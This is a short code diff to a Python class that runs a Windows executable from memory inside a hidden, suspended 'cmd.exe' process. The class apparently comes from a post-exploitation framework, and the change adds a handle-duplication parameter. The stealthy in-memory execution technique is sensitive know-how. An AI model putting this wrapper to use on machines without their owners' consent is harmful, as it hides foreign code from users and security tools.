@@ -45,7 +45,7 @@ def ReadFile(handle, max_bytes):
 
 class MemoryPE(object):
 	""" run a pe from memory. The program output is displayed on program exit. You can set a timeout or raise KeyboardInterrupt to kill the program. If a timeout is set it will kill the program when it reaches the delay """
-	def __init__(self, raw_pe, args=[], suspended_process="cmd.exe", redirect_stdio=True, hidden=True):
+	def __init__(self, raw_pe, args=[], suspended_process="cmd.exe", redirect_stdio=True, hidden=True, dupHandle=None):
 		self.cmdline=suspended_process
 		if args:
 			self.cmdline+=" "+" ".join(args)
@@ -55,6 +55,9 @@ class MemoryPE(object):
 		self.hidden=hidden
 		self.hProcess=None
 		self.rpStdout=None
+		self.dupHandle=dupHandle
+		if self.dupHandle is None:
+			self.dupHandle=0
 		self.EOF=threading.Event()
 
 	def close(self):
@@ -121,7 +124,7 @@ class MemoryPE(object):
 				break
 
 	def run(self):
-		hProcess, pStdin, pStdout, rpStdin, rpStdout =  pupymemexec.run_pe_from_memory(self.cmdline, self.raw_pe, self.redirect_stdio, self.hidden)
+		hProcess, pStdin, pStdout, rpStdin, rpStdout =  pupymemexec.run_pe_from_memory(self.cmdline, self.raw_pe, self.redirect_stdio, self.hidden, self.dupHandle)
 		self.pStdout=pStdout
 		self.pStdin=pStdin
 		self.rpStdout=rpStdout
